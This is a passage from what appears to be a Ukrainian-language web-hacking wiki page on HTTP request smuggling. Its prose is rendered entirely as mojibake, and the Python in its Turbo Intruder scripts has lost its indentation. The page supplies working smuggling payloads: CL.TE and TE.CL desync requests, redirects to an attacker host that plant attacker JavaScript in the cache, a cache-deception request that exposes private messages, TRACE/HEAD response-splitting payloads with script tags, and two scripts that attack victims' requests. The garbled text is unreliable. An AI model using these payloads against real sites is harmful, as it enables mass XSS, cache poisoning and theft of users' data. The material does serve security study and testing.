–¶–µ–π –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–∏–π –∑–∞–ø–∏—Ç –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Ç–æ–≥–æ, —â–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –æ–±—Ä–æ–±–ª–µ–Ω–∏–π –∑–∞–ø–∏—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±—É–¥–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ –≤–µ–±-—Å–∞–π—Ç, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
–†–µ–∑—É–ª—å—Ç–∞—Ç–∏ –≤:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
–£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –∑–∞–ø–∏—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–∞ —Ñ–∞–π–ª JavaScript –ø–µ—Ä–µ—Ö–æ–ø–ª—é—î—Ç—å—Å—è. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –Ω–∞–¥–∞—é—á–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π JavaScript —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ—Ç—Ä—É—î–Ω–Ω—è –≤–µ–±-–∫–µ—à—É —á–µ—Ä–µ–∑ HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

–û—Ç—Ä—É—î–Ω–Ω—è –≤–µ–±-–∫–µ—à—É –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–æ, —è–∫—â–æ –±—É–¥—å-—è–∫–∏–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç **—ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∏ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥—É –∫–µ—à—É—î –∫–æ–Ω—Ç–µ–Ω—Ç**, –∑–∞–∑–≤–∏—á–∞–π –¥–ª—è –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ. –ú–∞–Ω—ñ–ø—É–ª—é—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–¥—é —Å–µ—Ä–≤–µ—Ä–∞, –º–æ–∂–Ω–∞ **–æ—Ç—Ä—É—ó—Ç–∏ –∫–µ—à**.

–†–∞–Ω—ñ—à–µ –º–∏ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–ª–∏, —è–∫ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω—ñ, —â–æ–± –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ –ø–æ–º–∏–ª–∫—É 404 (–¥–∏–≤. [–û—Å–Ω–æ–≤–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏](./#basic-examples)). –ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, –º–æ–∂–ª–∏–≤–æ –æ–±–º–∞–Ω—É—Ç–∏ —Å–µ—Ä–≤–µ—Ä, —â–æ–± –≤—ñ–Ω –Ω–∞–¥–∞–≤ –∫–æ–Ω—Ç–µ–Ω—Ç `/index.html` —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –∑–∞–ø–∏—Ç `/static/include.js`. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ, –∫–æ–Ω—Ç–µ–Ω—Ç `/static/include.js` –∑–∞–º—ñ–Ω—é—î—Ç—å—Å—è –≤ –∫–µ—à—ñ –Ω–∞ –∫–æ–Ω—Ç–µ–Ω—Ç `/index.html`, —â–æ —Ä–æ–±–∏—Ç—å `/static/include.js` –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏–∑–≤–æ–¥—è—á–∏ –¥–æ –≤—ñ–¥–º–æ–≤–∏ –≤ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ (DoS).

–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ —Å—Ç–∞—î –æ—Å–æ–±–ª–∏–≤–æ –ø–æ—Ç—É–∂–Ω–æ—é, —è–∫—â–æ –≤–∏—è–≤–ª–µ–Ω–æ **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Open Redirect** –∞–±–æ —è–∫—â–æ —î **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ —Å–∞–π—Ç—ñ –¥–æ –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è**. –¢–∞–∫—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –∑–∞–º—ñ–Ω–∏ –∫–µ—à–æ–≤–∞–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É `/static/include.js` –Ω–∞ —Å–∫—Ä–∏–ø—Ç –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, —â–æ —Ñ–∞–∫—Ç–∏—á–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –∑–¥—ñ–π—Å–Ω–∏—Ç–∏ —à–∏—Ä–æ–∫–æ–º–∞—Å—à—Ç–∞–±–Ω—É –∞—Ç–∞–∫—É Cross-Site Scripting (XSS) –ø—Ä–æ—Ç–∏ –≤—Å—ñ—Ö –∫–ª—ñ—î–Ω—Ç—ñ–≤, —è–∫—ñ –∑–∞–ø–∏—Ç—É—é—Ç—å –æ–Ω–æ–≤–ª–µ–Ω–∏–π `/static/include.js`.

–ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ —ñ–ª—é—Å—Ç—Ä–∞—Ü—ñ—é –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **–æ—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É –≤ –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è–º –Ω–∞ —Å–∞–π—Ç—ñ –¥–æ –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è**. –ú–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –∑–º—ñ–Ω–∏—Ç–∏ –∫–µ—à–æ–≤–∞–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç `/static/include.js`, —â–æ–± –Ω–∞–¥–∞—Ç–∏ JavaScript-–∫–æ–¥, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –≤–±—É–¥–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç, —â–æ –Ω–∞—Ü—ñ–ª–µ–Ω–∏–π –Ω–∞ `/post/next?postId=3`. –¶–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–π –Ω–∞ `/post?postId=4`, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **–∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ Host** –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –¥–æ–º–µ–Ω—É. –ó–º—ñ–Ω—é—é—á–∏ **–∑–∞–≥–æ–ª–æ–≤–æ–∫ Host**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ –∑–∞–ø–∏—Ç –Ω–∞ —Å–≤—ñ–π –¥–æ–º–µ–Ω (**–≤–Ω—É—Ç—Ä—ñ—à–Ω—î –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —Ä–µ–¥–∏—Ä–µ–∫—Ç**).

–ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ–≥–æ **–æ—Ç—Ä—É—î–Ω–Ω—è —Å–æ–∫–µ—Ç–∞** —Å–ª—ñ–¥ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ **GET –∑–∞–ø–∏—Ç** –Ω–∞ `/static/include.js`. –¶–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–∏–π –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º –∑–∞–ø–∏—Ç–æ–º **–≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —Ä–µ–¥–∏—Ä–µ–∫—Ç** —ñ –æ—Ç—Ä–∏–º–∞—î –≤–º—ñ—Å—Ç —Å–∫—Ä–∏–ø—Ç–∞, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–≥–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º.

–í –ø–æ–¥–∞–ª—å—à–æ–º—É –±—É–¥—å-—è–∫–∏–π –∑–∞–ø–∏—Ç –Ω–∞ `/static/include.js` –±—É–¥–µ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞—Ç–∏ –∫–µ—à–æ–≤–∞–Ω–∏–π –≤–º—ñ—Å—Ç —Å–∫—Ä–∏–ø—Ç–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –∑–∞–ø—É—Å–∫–∞—é—á–∏ —à–∏—Ä–æ–∫–∏–π XSS-–∞—Ç–∞–∫—É.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è HTTP request smuggling –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –æ–±–º–∞–Ω—É –≤–µ–±-–∫–µ—à—É <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **–£ —á–æ–º—É —Ä—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ –æ—Ç—Ä—É—î–Ω–Ω—è–º –≤–µ–±-–∫–µ—à—É —Ç–∞ –æ–±–º–∞–Ω–æ–º –≤–µ–±-–∫–µ—à—É?**
>
> * –£ **–æ—Ç—Ä—É—î–Ω–Ω—ñ –≤–µ–±-–∫–µ—à—É** –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—É—à—É—î –¥–æ–¥–∞—Ç–æ–∫ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –¥–µ—è–∫–∏–π —à–∫—ñ–¥–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç —É –∫–µ—à—ñ, —ñ —Ü–µ–π –≤–º—ñ—Å—Ç –æ–±—Å–ª—É–≥–æ–≤—É—î—Ç—å—Å—è –∑ –∫–µ—à—É —ñ–Ω—à–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –¥–æ–¥–∞—Ç–∫–∞.
> * –£ **–æ–±–º–∞–Ω—ñ –≤–µ–±-–∫–µ—à—É** –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—É—à—É—î –¥–æ–¥–∞—Ç–æ–∫ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –¥–µ—è–∫–∏–π —á—É—Ç–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç, —â–æ –Ω–∞–ª–µ–∂–∏—Ç—å —ñ–Ω—à–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É, —É –∫–µ—à—ñ, –∞ –ø–æ—Ç—ñ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –æ—Ç—Ä–∏–º—É—î —Ü–µ–π –≤–º—ñ—Å—Ç –∑ –∫–µ—à—É.

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ —Å—Ç–≤–æ—Ä—é—î –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–Ω–∏–π –∑–∞–ø–∏—Ç, —è–∫–∏–π –æ—Ç—Ä–∏–º—É—î —á—É—Ç–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–π –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –†–æ–∑–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
–Ø–∫—â–æ —Ü–µ–π –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–∏–π –∑–∞–ø–∏—Ç –æ—Ç—Ä—É—é—î –∫–µ—à-–µ–Ω—Ü—ñ—é, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—É –¥–ª—è —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `/someimage.png`), —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ –∂–µ—Ä—Ç–≤–∏ –∑ `/private/messages` –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∫–µ—à–æ–≤–∞–Ω—ñ –ø—ñ–¥ –∫–µ—à-–µ–Ω—Ü—ñ—î—é —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É. –í–Ω–∞—Å–ª—ñ–¥–æ–∫ —Ü—å–æ–≥–æ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü—ñ –∫–µ—à–æ–≤–∞–Ω—ñ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è TRACE —á–µ—Ä–µ–∑ HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**–£ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://portswigger.net/research/trace-desync-attack) –ø—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è, —â–æ —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –º–∞—î –º–µ—Ç–æ–¥ TRACE —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º, —Ü–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –Ω–∏–º –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é HTTP Request Smuggling. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ —Ü–µ–π –º–µ—Ç–æ–¥ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏–º–µ –±—É–¥—å-—è–∫–∏–π –∑–∞–≥–æ–ª–æ–≤–æ–∫, –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä, —è–∫ —á–∞—Å—Ç–∏–Ω—É —Ç—ñ–ª–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
–í—ñ–¥–ø—Ä–∞–≤–∏—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥—å, —Ç–∞–∫—É —è–∫:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
–ü—Ä–∏–∫–ª–∞–¥–æ–º –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü—ñ—î—é –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é –±—É–¥–µ **–ø–µ—Ä–µ–ø—Ä–∞–≤–∫–∞ —Å–ø–æ—á–∞—Ç–∫—É –∑–∞–ø–∏—Ç—É HEAD**. –ù–∞ —Ü–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–Ω–æ –ª–∏—à–µ **–∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏** –∑–∞–ø–∏—Ç—É GET (**`Content-Type`** —Å–µ—Ä–µ–¥ –Ω–∏—Ö). –Ü –ø–µ—Ä–µ–ø—Ä–∞–≤–∏—Ç–∏ **–æ–¥—Ä–∞–∑—É –ø—ñ—Å–ª—è HEAD –∑–∞–ø–∏—Ç TRACE**, —è–∫–∏–π –±—É–¥–µ **–≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏ –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –¥–∞–Ω—ñ**.\
–û—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ HEAD –º—ñ—Å—Ç–∏—Ç–∏–º–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length`, **–≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –∑–∞–ø–∏—Ç TRACE –±—É–¥–µ —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏—Å—è —è–∫ —Ç—ñ–ª–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ HEAD, –æ—Ç–∂–µ, –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—á–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –¥–∞–Ω—ñ** —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.\
–¶—è –≤—ñ–¥–ø–æ–≤—ñ–¥—å –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–∞ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É —á–µ—Ä–µ–∑ –∑'—î–¥–Ω–∞–Ω–Ω—è, —Ç–æ–º—É —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –≤ –∫–µ—à–æ–≤–∞–Ω–æ–º—É JS —Ñ–∞–π–ª—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–ª—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ JS –∫–æ–¥—É**.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è TRACE —á–µ—Ä–µ–∑ —Ä–æ–∑–¥—ñ–ª–µ–Ω–Ω—è HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

–ü—Ä–æ–¥–æ–≤–∂—É—é—á–∏ —Å–ª—ñ–¥–∫—É–≤–∞—Ç–∏ –∑–∞ [**—Ü–∏–º –ø–æ—Å—Ç–æ–º**](https://portswigger.net/research/trace-desync-attack), –ø—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è —ñ–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –º–µ—Ç–æ–¥–æ–º TRACE. –Ø–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ, –ø–µ—Ä–µ–ø—Ä–∞–≤–∫–∞ –∑–∞–ø–∏—Ç—É HEAD —ñ –∑–∞–ø–∏—Ç—É TRACE –¥–æ–∑–≤–æ–ª—è—î **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –¥–µ—è–∫—ñ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω—ñ –¥–∞–Ω—ñ** —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –∑–∞–ø–∏—Ç HEAD. –î–æ–≤–∂–∏–Ω–∞ —Ç—ñ–ª–∞ –∑–∞–ø–∏—Ç—É HEAD –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –≤–∫–∞–∑—É—î—Ç—å—Å—è –≤ –∑–∞–≥–æ–ª–æ–≤–∫—É Content-Length —ñ —Ñ–æ—Ä–º—É—î—Ç—å—Å—è –≤—ñ–¥–ø–æ–≤—ñ–¥–¥—é –Ω–∞ –∑–∞–ø–∏—Ç TRACE.

–û—Ç–∂–µ, –Ω–æ–≤–∞ —ñ–¥–µ—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ, –∑–Ω–∞—é—á–∏ —Ü–µ–π Content-Length —ñ –¥–∞–Ω—ñ, –Ω–∞–¥–∞–Ω—ñ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ TRACE, –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± –≤—ñ–¥–ø–æ–≤—ñ–¥—å TRACE –º—ñ—Å—Ç–∏–ª–∞ –¥—ñ–π—Å–Ω—É HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—å –ø—ñ—Å–ª—è –æ—Å—Ç–∞–Ω–Ω—å–æ–≥–æ –±–∞–π—Ç–∞ Content-Length, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–æ–≤–Ω—ñ—Å—Ç—é –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ (—â–æ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –æ—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É).

–ü—Ä–∏–∫–ª–∞–¥:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
–ó–≥–µ–Ω–µ—Ä—É—î —Ü—ñ —Ü—ñ responses (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ HEAD —î Content-Length, —â–æ —Ä–æ–±–∏—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥—å TRACE —á–∞—Å—Ç–∏–Ω–æ—é —Ç—ñ–ª–∞ HEAD, —ñ —è–∫ —Ç—ñ–ª—å–∫–∏ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è Content-Length HEAD, –¥—ñ–π—Å–Ω–∞ HTTP –≤—ñ–¥–ø–æ–≤—ñ–¥—å –ø—Ä–∏—Ö–æ–≤–∞–Ω–∞):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(‚Äúarbitrary response‚Äù)</script>
```
### –û–∑–±—Ä–æ—î–Ω–Ω—è HTTP Request Smuggling –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é HTTP Response Desynchronisation

–í–∏ –∑–Ω–∞–π—à–ª–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å HTTP Request Smuggling —ñ –Ω–µ –∑–Ω–∞—î—Ç–µ, —è–∫ —ó—ó –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏. –°–ø—Ä–æ–±—É–π—Ç–µ —Ü—ñ —ñ–Ω—à—ñ –º–µ—Ç–æ–¥–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### –Ü–Ω—à—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ HTTP Request Smuggling

* HTTP Request Smuggling —É –±—Ä–∞—É–∑–µ—Ä—ñ (–ö–ª—ñ—î–Ω—Ç—Å—å–∫–∞ —Å—Ç–æ—Ä–æ–Ω–∞)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling —É –∑–Ω–∏–∂–µ–Ω–Ω—ñ –≤–µ—Ä—Å—ñ—ó HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## –°–∫—Ä–∏–ø—Ç–∏ Turbo intruder

### CL.TE

–ó [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

–í—ñ–¥: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
